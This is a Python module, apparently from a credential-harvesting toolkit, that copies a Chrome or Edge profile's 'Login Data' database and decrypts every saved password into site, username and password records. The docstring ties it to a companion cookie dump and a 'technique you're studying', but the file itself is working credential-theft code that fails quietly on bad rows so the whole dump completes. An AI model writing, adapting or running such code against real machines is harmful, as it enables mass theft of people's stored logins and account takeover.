"""Chromium (Chrome / Edge) saved-login decryption.

Chrome stores saved passwords in the "Login Data" SQLite DB, `logins`
table. Passwords are encrypted with the same AES scheme as cookies
(see chrome_crypto.py); usernames and URLs are plaintext columns.

The value for the technique you're studying: full credential pairs
(site -> username + password) for every "remember password" entry, using
the same OS-bound key as the cookie dump.

Column mapping (Chrome's schema):
  origin_url, action_url, username_element, username_value,
  password_value, signon_realm, date_created, ...
"""

from __future__ import annotations

import os
import shutil
import sqlite3
import tempfile
from dataclasses import dataclass, field
from typing import Any

from .chrome_crypto import ChromeDecryptError, ChromeKeyError


@dataclass
class Login:
    """One saved Chrome/Edge login, decrypted."""

    hostname: str
    username: str
    password: str
    signon_realm: str | None = None
    guid: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "hostname": self.hostname,
            "username": self.username,
            "password": self.password,
            "signonRealm": self.signon_realm,
            "guid": self.guid,
        }


def copy_db(profile_path: str) -> str | None:
    """Copy Login Data (+ WAL) into a temp dir, or None if absent."""
    src = os.path.join(profile_path, "Login Data")
    if not os.path.isfile(src):
        return None
    tmp = tempfile.mkdtemp(prefix="chrome-logins-")
    dst = os.path.join(tmp, "Login Data")
    shutil.copy2(src, dst)
    wal = src + "-wal"
    if os.path.isfile(wal):
        try:
            shutil.copy2(wal, dst + "-wal")
        except OSError:
            pass
    return tmp


def decrypt_password(encrypted_value: bytes, key: bytes) -> str:
    """Decrypt one password blob; marker on failure so one bad row never
    kills the whole dump."""
    if not encrypted_value:
        return ""
    try:
        from .chrome_crypto import decrypt_value

        return decrypt_value(encrypted_value, key)
    except (ChromeDecryptError, ChromeKeyError):
        return "*** decryption failed ***"


def dump_logins(profile_path: str, key: bytes) -> list[Login]:
    """Decrypt every saved login in a Chromium profile."""
    tmp = copy_db(profile_path)
    if tmp is None:
        return []
    try:
        db = os.path.join(tmp, "Login Data")
        conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT origin_url, username_value, password_value, "
                "signon_realm, guid FROM logins ORDER BY origin_url"
            ).fetchall()
        finally:
            conn.close()

        logins: list[Login] = []
        for r in rows:
            logins.append(
                Login(
                    hostname=r["origin_url"] or "",
                    username=r["username_value"] or "",
                    password=decrypt_password(bytes(r["password_value"] or b""), key),
                    signon_realm=r["signon_realm"],
                    guid=r["guid"] or "",
                )
            )
        return logins
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
